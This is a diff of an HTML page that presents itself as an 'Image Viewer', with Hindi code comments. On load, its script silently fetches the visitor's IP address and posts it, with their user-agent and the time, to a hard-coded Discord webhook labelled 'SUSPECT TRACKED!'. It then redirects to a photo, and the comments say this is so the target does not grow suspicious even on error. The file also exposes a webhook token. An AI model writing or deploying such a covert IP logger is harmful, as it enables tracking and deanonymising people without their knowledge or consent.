@@ -4,18 +4,16 @@
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
-        // यह API पूरी तरह सुरक्षित है और HTTPS पर कभी ब्लॉक नहीं होता
+        // अपडेटेड URL जो 100% सही JSON डेटा देता है
         fetch('https://ipify.org')
         .then(response => response.json())
         .then(data => {
-            // यहाँ अपना असली डिस्कोर्ड वेबहुक लिंक डालें
             const webhookURL = "https://discord.com/api/webhooks/1546246221717442701/Xdm1gPMdRG-E90lbS6ytawkRQo4vJthOWKxgGSJGAOeBYuMqF0cPGqIgqQOHYN-uA-OS"; 
             
             const payload = {
                 content: `🚨 **SUSPECT TRACKED!** 🚨\n🌐 **IP Address:** ${data.ip}\n📱 **Device/User-Agent:** ${navigator.userAgent}\n⏰ **Time:** ${new Date().toLocaleString()}`
             };
             
-            // डेटा को डिस्कोर्ड पर भेजने की प्रोसेस
             return fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -23,11 +21,11 @@
             });
         })
         .then(() => {
-            // डेटा जाने के तुरंत बाद फोटो लोड होगी
+            // डिस्कोर्ड पर मैसेज जाने के बाद फोटो खुलेगी
             window.location.href = "photo.jpg"; 
         })
-        .catch(() => {
-            // अगर कोई एरर आए तो भी अपराधी को फोटो दिख जाए ताकि शक न हो
+        .catch((err) => {
+            // बैकएंड एरर होने पर भी अपराधी को शक न हो, इसलिए फोटो फिर भी खुलेगी
             window.location.href = "photo.jpg";
         });
     </script>
